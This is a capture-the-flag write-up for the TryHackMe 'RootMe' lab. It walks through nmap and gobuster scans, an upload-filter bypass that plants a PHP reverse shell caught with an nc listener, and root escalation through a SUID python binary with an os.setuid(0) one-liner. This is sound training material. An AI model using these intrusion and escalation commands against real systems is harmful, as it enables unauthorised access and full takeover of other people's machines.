<p align="center"><img src="./Cover.png" width="310" ></p>
<h1><p align="center">Simple CTF : </p></h1> <h2><p align="center"> A ctf for beginners, can you root me?</p></h2>
                                                                                                                

### Room Link: [RootMe](https://tryhackme.com/room/rrootme) 

## Recon...
So I began with nmap scan to Find entry points.
```bash 
$ sudo nmap -T4 -sC -sS -A 10.10.210.59 > nmap.out
$ cat nmap.out

Starting Nmap 7.60 ( https://nmap.org ) at 2021-03-22 11:00 GMT
Nmap scan report for ip-10-10-231-92.eu-west-1.compute.internal (10.10.231.92)
Host is up (0.00038s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (EdDSA)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
MAC Address: 02:31:87:E1:4C:F5 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.38 ms ip-10-10-231-92.eu-west-1.compute.internal (10.10.231.92)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.11 seconds
```

As I can see there is a http server running on target. Lets checkout and let dirbuster run in background.
```bash
$ sudo gobuster dir -u http://10.10.231.92/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -o dir.out
$ cat dir.out 

http://10.10.231.92/uploads (Status: 301)
http://10.10.231.92/css (Status: 301)
http://10.10.231.92/js (Status: 301)
http://10.10.231.92/panel (Status: 301)
http://10.10.231.92/server-status (Status: 403)

```

## Foot Hold...

Now there are 2 directories that I found intresting and one had a upload form. So I tried to upload php reverse shell script and bypassed with burp. 
While ```nc``` Listening in background.
```bash
$ sudo nc -lvnp 8080 

uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$whoami
www-data 
```
We have a reverse shell, stabalize it with this one liner ``` python3 -c 'import pty;pty.spawn("/bin/bash")'```.

Now find user.txt flag.
```bash
www-data@rootme:/$ find / -name user.txt -type f 2>/dev/null

/var/www/user.txt

www-data@rootme:/$ cat /var/www/user.txt

THM{****************}
```

## Privlege Escalation...

Lets enumerate the user. I used [Linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
for it.
```bash 
www-data@rootme:/var/tmp$ ./linpeas.sh
./linpeas.sh
 Starting linpeas. Caching Writable Folders...

                     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄▄
      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄
  ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄
  ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
  ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
  ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
  ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
  ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
  ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
  ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
  ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
  ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
  ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
  ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
   ▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄
        ▄▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄ 
             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
    linpeas v3.0.2 by carlospolop
                                                                                                                             
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.                                                                                               
                                                                                                                             
...
[+] SUID - Check easy privesc, exploits and write perms                                                                      
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                
strings Not Found                                                                                                            
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/9665/bin/ping6                                              
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/9665/bin/ping
-rwsr-sr-x 1 root   root            3.5M Aug  4  2020 /usr/bin/python
```
So there is a SUID set for python as root, lets exploit it.Check [GTFOBins](https://gtfobins.github.io/gtfobins/python/).

```bash
www-data@rootme:/$ /usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/sh")'

# python3 -c 'import pty;pty.spawn("/bin/bash")'
root@rootme:/# whoami
root
root@rootme:/# cat /root/root.txt

THM{*******************}
```

Now root flag can be obatined but I wannted to own the root on **RootMe** so I changed the password and rooted the box.
